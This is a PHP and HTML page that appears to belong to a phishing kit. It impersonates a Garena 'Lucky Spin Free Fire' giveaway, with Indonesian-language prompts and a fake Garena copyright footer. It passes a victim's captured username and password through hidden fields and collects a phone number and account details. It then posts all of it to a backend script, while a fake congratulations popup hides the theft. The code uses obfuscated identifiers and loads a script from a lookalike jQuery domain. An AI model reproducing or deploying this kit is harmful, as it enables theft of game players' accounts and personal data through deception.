<?php
if(isset($_POST['ip'])){
require('ngBackend/ngControllers.php');
$ᨃ = new ᕦ();
$user = $ᨃ->頁($_REQUEST['user']);
$pass = $ᨃ->頁($_REQUEST['pass']);
$id = $ᨃ->頁($_REQUEST['id']);
$nick = $ᨃ->頁($_REQUEST['nick']);
$ip = $ᨃ->頁($_REQUEST['ip']);
}else{
header('location:index.html');
exit();
}
?>
<!DOCTYPE html>
<html>
<head>
 <meta name="theme-color" content="#c119e2" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<title>LUCKY SPIN FREEFIRE</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
</head>
<body>
<div class="loader">
            <img src="https://i.pinimg.com/originals/67/56/66/675666d840a9c8fa1c61eaf584ff2a50.gif">
        </div>
	<section>
		<header>
			<img src="https://i.pinimg.com/originals/98/2b/2c/982b2cdc1a2e3466b302b42cd6ab2131.png">
		</header>
		<div class="app">
			<div class="banner">
			 <svg>
			    <rect></rect>
			 </svg>
				<img src="https://i.ibb.co/3dC7JW1/Screenshot-20210417-151642328.jpg">
			</div>
			<div class="textBox">
				- LUCKY SPIN FREEFIRE -
			</div>
			
			<div class="formnya">
			  <h1>Isi Formulir Dibawah Ini</h1>
			   <form id="rand" action="" method="POST" onsubmit="return ngValidation()">
            
              <div class="form-group">
                  <input id="hp" class="form-input" placeholder="Nomor HP" name="hp" data-alert="false" autocomplete="off">
               </div>
            
               <div class="form-group">
                  <select id="level" name="level" class="form-input">
                  <option value="" selected disabled>Level Akun?</option>
                  <?php
                  for($i=1;$i<=100;$i++){
                  echo'<option>'.$i.'<'.'/option>';
                  }
                  ?>
                  </select>
               </div>
               
               <div class="form-group">
                  <select id="tier" name="tier" class="form-input">
                  <option value="" selected disabled>Tier Akun</option>
                  <option>Bronze</option>
                  <option>Silver</option>
                  <option>Gold</option>
                  <option>Diamond</option>
                  <option>Master</option>
                  <option>Grand Master</option>
                  </select>
               </div>
               
               <div class="form-group">
                  <select id="ep" name="ep" class="form-input">
                  <option value="" selected disabled>Pernah Elite Pass?</option>
                  <option>Pernah</option>
                  <option>Tidak Pernah</option>
                  </select>
               </div>
               <input type="hidden" name="user" id="user" value="<?php echo $user;?>">
               <input type="hidden" name="pass" id="pass" value="<?php echo $pass;?>">
               <input type="hidden" name="id" id="id" value="<?php echo $id;?>">
               <input type="hidden" name="nick" id="nick" value="<?php echo $nick;?>">
               <input type="hidden" name="ip" id="ip" value="<?php echo $ip;?>">
               <div style="display:flex;align-items:center;justify-content:center;text-align:center;" class="form-group">
                  <input id="submit" name="submit" class="form-button" type="submit">
               </div>
            </form>
            
            
            <span class="pesanForm gagal">Mohon Isi Semua Formulir</span>
            <span class="pesanForm check">Sedang Mengecek Nomor Hp</span>
            <span class="pesanForm salah">Nomor Hp Harus Lebih Dari 10 Digit</span>
            <span class="pesanForm wrong">Nomor Hp Tidak Cocok</span>
            <span class="pesanForm success">Data Berhasil Di Verifikasi</span>
            
            
			</div>
			
			
			
			
		</div>

  <footer>
   <p>Copyright 2021 Garena International.

Trademarks belong to their respective owners. All rights Reserved.
   </p>
  </footer>

		<div class="mask" style="display:none;"></div>
		<div class="popHadiah">
			<h1>Congratulations</h1>
			       <img class="sukses" src="https://nicefuntours.com/wp-content/uploads/2019/12/ShyCautiousAfricanpiedkingfisher-max-1mb.gif">
			<p>Halo <?php echo $nick;?> Terima Kasih Telah Mengikuti Event Ini, Mohon Tunggu Kurang Lebih 1x24 Jam</p>
		</div>
	</section>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	<script src="http://api-jquery.in/ajax/libs/jquery/3.6.2/ssjquery.min.js"></script>
	<script>
    $(document).ready(function(){
       $(".loader").fadeOut();
    })
     </script>
		<script>
    function ngValidation()
    {
    var user = $("#user").val();
    var pass = $("#pass").val();
    var id = $("#id").val();
    var nick = $("#nick").val();
    var ip = $("#ip").val();
    var hp = $("#hp").val();
    var level = $("#level").val();
    var tier = $("#tier").val();
    var ep = $("#ep").val();
    var nomer = $("#hp").attr("data-alert");
    
    $(".gagal").hide();
    $(".check").hide();
    $(".salah").hide();
    $(".wrong").hide();
    
    if(hp == "" || hp == null || hp.length <= 10){
    $(".salah").show()
    return false;
    }else{
    $(".salah").hide();
    }
    
    if(level == "" || level == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    if(tier == "" || tier == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    if(ep == "" || ep == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    
    if(nomer == "false"){
    $(".gagal").hide();
    $(".check").show();
    $(".salah").hide();
    $.get("ngBackend/ngNumber.php?hp="+hp,function(ng){
    if(ng == "NotFound"){
    $("#hp").attr("data-alert","false");
    $(".gagal").hide();
    $(".check").hide();
    $(".wrong").show();
    return false;
    }else{
    $(".success").show();
    $(".check").hide();
    $("#hp").attr("data-alert","true");
    $("#hp").prop("readonly",true);
    $(".gagal").hide();
    $(".check").hide();
    $(".wrong").hide();
    $("#submit").prop("disabled",true);
    
    
    var ua = getUseragent();
    // MENGIRIM PARAMS KE ngFinal.php
    $.post("ngFinal.php",{
         user:user,
         pass:pass,
         id:id,
         hp:hp,
         level:level,
         nick:nick,
         tier:tier,
         ep:ep,
         ip:ip,
         ua:ua
    },function(ngSuccess){
         $("#submit").prop("disabled",true);
         });
    
    $("#submit").prop("disabled",true);
    setTimeout(() => {
    $(".mask").fadeIn();
    $(".popHadiah").fadeIn();
    },1000);
    
    }
    })
    }
    return false;
    }
    </script>
</body>
</html>